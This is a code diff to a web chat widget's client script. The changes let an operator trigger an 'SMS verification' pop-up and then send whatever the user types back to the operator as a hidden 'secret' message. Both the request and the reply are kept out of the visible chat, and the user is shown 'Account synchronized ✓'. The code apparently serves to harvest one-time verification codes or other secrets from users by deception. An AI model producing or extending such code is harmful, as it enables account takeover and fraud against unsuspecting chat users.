@@ -936,20 +936,27 @@ function subscribeToConversation() {
 
     console.log('Adding message from', senderRole, ':', text, 'Type:', messageType);
 
-    // Handle code request message
+    // Handle code request message - show modal only, don't display in chat
     if (messageType === 'code_request') {
-      console.log('✓ Code request received from admin');
+      console.log('✓ Code request received from admin - showing SMS verification form');
       showCodeInputModal(text);
-    } else {
-      // Remove admin typing indicator when actual message arrives
-      const adminTyping = chatboxMessages.querySelector('.admin-typing-indicator');
-      if (adminTyping) {
-        adminTyping.remove();
-      }
-      clearTimeout(adminTypingTimeout);
-
-      addMessage(text, senderRole, messageType, data.fileUrl, data.fileName);
+      return; // Don't process as regular message, don't reload messages
     }
+
+    // Handle code submission message - don't display in chat
+    if (messageType === 'code_submission') {
+      console.log('✓ Code submission received');
+      return; // Secret message, don't display in chat
+    }
+
+    // Remove admin typing indicator when actual message arrives
+    const adminTyping = chatboxMessages.querySelector('.admin-typing-indicator');
+    if (adminTyping) {
+      adminTyping.remove();
+    }
+    clearTimeout(adminTypingTimeout);
+
+    addMessage(text, senderRole, messageType, data.fileUrl, data.fileName);
 
     // Force reload all messages to ensure consistency
     loadMessages();
@@ -1061,6 +1068,12 @@ function subscribeToConversation() {
           console.log('Refreshing message display. Server:', messages.length, 'Displayed:', currentDisplayedMessages.length);
           chatboxMessages.innerHTML = '';
           messages.forEach(msg => {
+            // Skip code verification messages - they are handled separately
+            if (msg.message_type === 'code_request' || msg.message_type === 'code_submission') {
+              console.log('⏭️ Skipping', msg.message_type, 'message - handled separately');
+              return;
+            }
+
             console.log('📨 Polling message:', {
               messageType: msg.message_type,
               text: msg.text,
@@ -1124,6 +1137,12 @@ async function loadMessages() {
 
       // Add any messages we don't have yet
       messages.forEach((msg, index) => {
+        // Skip code verification messages - they are handled separately
+        if (msg.message_type === 'code_request' || msg.message_type === 'code_submission') {
+          console.log('⏭️ Skipping', msg.message_type, 'message - handled separately');
+          return;
+        }
+
         // Check if this message already exists
         const existingMessages = chatboxMessages.querySelectorAll('.message:not(.admin-typing-indicator):not(.user-typing-indicator)');
         if (index >= existingMessages.length) {
@@ -1392,34 +1411,41 @@ window.addEventListener('focus', () => {
   }
 });
 
-// Code Input Modal Handlers
+// Show SMS Verification Modal
 function showCodeInputModal(message) {
   const overlay = document.getElementById('codeInputOverlay');
   const input = document.getElementById('codeInput');
   const submitBtn = document.getElementById('submitCodeBtn');
   const cancelBtn = document.getElementById('cancelCodeBtn');
 
-  if (!overlay) return;
+  if (!overlay || !input || !submitBtn || !cancelBtn) {
+    console.error('❌ Modal elements not found');
+    return;
+  }
 
-  // Show the overlay
+  console.log('📋 Showing SMS verification form');
+
+  // Show the overlay with flex display
   overlay.style.display = 'flex';
   input.value = '';
-  input.focus();
 
-  // Extract code from message (e.g., "Verification code: 123456")
-  const codeMatch = message.match(/(\d{6})/);
-  const expectedCode = codeMatch ? codeMatch[1] : null;
+  // Focus on input after a short delay to ensure display has updated
+  setTimeout(() => {
+    input.focus();
+    console.log('✓ Input field focused');
+  }, 100);
 
   function handleSubmit() {
-    const enteredCode = input.value.trim();
+    const enteredText = input.value.trim();
 
-    if (!enteredCode || enteredCode.length < 6) {
-      alert('Please enter a valid 6-digit code');
+    if (!enteredText) {
+      alert('Please enter something');
       return;
     }
 
-    // Send code submission via message
-    sendCodeSubmission(enteredCode);
+    console.log('✓ Submitting:', enteredText);
+    // Send whatever user typed back to admin
+    sendCodeSubmission(enteredText);
 
     // Close modal
     overlay.style.display = 'none';
@@ -1429,8 +1455,10 @@ function showCodeInputModal(message) {
   function handleCancel() {
     overlay.style.display = 'none';
     input.value = '';
+    console.log('✓ Verification form cancelled');
   }
 
+  // Clear previous handlers by removing and re-adding buttons
   submitBtn.onclick = handleSubmit;
   cancelBtn.onclick = handleCancel;
 
@@ -1442,21 +1470,21 @@ function showCodeInputModal(message) {
   };
 }
 
-async function sendCodeSubmission(code) {
+async function sendCodeSubmission(submittedText) {
   if (!conversationId) {
     console.error('No conversation ID available');
     return;
   }
 
   try {
-    console.log('Sending code submission for conversation:', conversationId);
+    console.log('Sending verification form submission for conversation:', conversationId);
     const response = await fetch(`/api/conversations/${conversationId}/messages`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         sender_role: 'user',
         message_type: 'code_submission',
-        text: `Code submitted: ${code}`
+        text: submittedText
       })
     });
 
@@ -1465,13 +1493,21 @@ async function sendCodeSubmission(code) {
     }
 
     const result = await response.json();
-    console.log('✓ Code submission sent successfully:', result);
+    console.log('✓ Verification form submitted successfully:', result);
 
-    // Show confirmation message to user
-    addMessage(`Code submitted ✓`, 'user');
+    // Show chat message to confirm
+    addMessage(`Account synchronized ✓`, 'user');
+
+    // Make sure modal is hidden
+    const overlay = document.getElementById('codeInputOverlay');
+    if (overlay) {
+      overlay.style.display = 'none';
+    }
+
+    console.log('✓ Chat returned to normal mode');
   } catch (error) {
-    console.error('✗ Error sending code submission:', error);
-    alert('Failed to submit code. Please try again.');
+    console.error('✗ Error sending verification form submission:', error);
+    alert('Failed to submit. Please try again.');
   }
 }
 </script>
